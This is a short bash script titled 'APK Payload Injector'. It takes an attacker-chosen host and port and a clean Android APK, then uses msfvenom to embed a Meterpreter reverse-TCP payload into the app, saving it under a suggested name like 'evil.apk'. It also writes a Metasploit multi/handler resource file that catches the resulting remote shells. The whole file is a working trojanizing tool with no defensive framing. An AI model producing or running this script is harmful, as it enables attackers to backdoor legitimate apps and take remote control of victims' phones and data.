#!/bin/bash

echo "==============================="
echo "        APK Payload Injector   "
echo "==============================="

# Ask for LHOST and LPORT
read -p "🌐 Enter LHOST: " lhost
read -p "🎯 Enter LPORT: " lport

# Loop to ensure the APK file exists
while true; do
    read -p "Enter the path to a clean APK file: " input_apk
    if [ -f "$input_apk" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an APK file."
    fi
done

# Ask for output APK file name
read -p "Enter the output file name (e.g., evil.apk): " output_apk

# Generate and inject the payload
echo "[*] Injecting payload into $input_apk..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -x "$input_apk" -o "$output_apk"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_apk"

    # Create Metasploit resource file
    listener_file="listener.r"
    echo "use exploit/multi/handler" > "$listener_file"
    echo "set payload android/meterpreter/reverse_tcp" >> "$listener_file"
    echo "set LHOST $lhost" >> "$listener_file"
    echo "set LPORT $lport" >> "$listener_file"
    echo "set ExitOnSession false" >> "$listener_file"
    echo "exploit -j" >> "$listener_file"

    echo "[+] Metasploit listener script saved as: $listener_file"
    echo "[*] You can run it using: msfconsole -r $listener_file"

else
    echo "[!] Injection failed. Please check your inputs."
fi




























